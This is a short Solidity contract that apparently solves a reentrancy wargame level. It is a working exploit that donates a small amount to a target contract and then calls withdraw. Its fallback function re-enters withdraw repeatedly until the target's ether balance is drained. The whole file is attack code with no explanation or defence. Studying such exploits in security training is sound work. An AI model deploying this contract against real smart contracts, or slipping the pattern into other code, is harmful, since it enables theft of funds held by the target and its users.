pragma solidity ^0.6.0;

interface Reentrance {
    function donate(address) external payable;

    function balanceOf(address) external view returns (uint256 balance);

    function withdraw(uint256) external;
}

contract ReentrecyAttack {
    address payable contractAddress;
    Reentrance public recontract;
    uint256 public balance;

    constructor(address _contractAddress) public payable {
        recontract = Reentrance(_contractAddress);
        balance = msg.value;
    }

    function donate() public payable {
        recontract.donate{value: msg.value}(address(this));
    }

    function attack() public payable {
        recontract.donate{value: 100000000000000}(address(this));
        recontract.withdraw(100000000000000);
    }

    fallback() external payable {
        if (address(recontract).balance > 0) {
            recontract.withdraw(100000000000000);
        }
    }
}
